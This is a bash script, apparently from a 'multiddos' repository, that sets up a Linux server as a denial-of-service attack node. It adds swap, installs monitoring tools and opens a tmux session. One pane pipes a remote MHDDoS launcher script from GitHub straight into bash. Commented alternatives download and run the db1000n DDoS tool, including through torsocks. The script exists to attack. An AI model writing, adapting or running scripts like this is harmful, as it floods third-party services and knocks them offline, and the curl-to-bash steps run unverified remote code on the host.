#!/bin/bash
# curl -s https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh -o md2.sh && bash md2.sh
sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
sleep 5
sudo apt update -y
sudo apt install -y tmux vnstat python3 python3-pip
# sudo apt install torsocks fish
# sudo apt instal gcc libc-dev libffi-dev libssl-dev python3-dev rustc
pip install --upgrade pip
# install docker
#sudo apt install apt-transport-https ca-certificates curl software-properties-common
#curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
#sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
#sudo apt install docker-ce -y

# chsh -s /usr/bin/fish
echo $HOSTNAME >> /etc/hostname
# sudo touch /etc/cloud/cloud-init.disabled
tmux kill-session -t multiddos; sudo pkill node
#tmux mouse support
grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf

cd ~
rm -rf multiddos
mkdir multiddos
cd multiddos

if [ ! -f "/usr/local/bin/gotop" ]; then
    curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
    sudo dpkg -i gotop.deb
fi

tmux new-session -s multiddos -d 'gotop -asc solarized'
sleep 0.1
tmux split-window -v 'vnstat -l'
sleep 0.1
#tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash -s -- 2000'
tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash -s -- 2000'
#sleep 0.1
#tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
tmux -2 attach-session -d
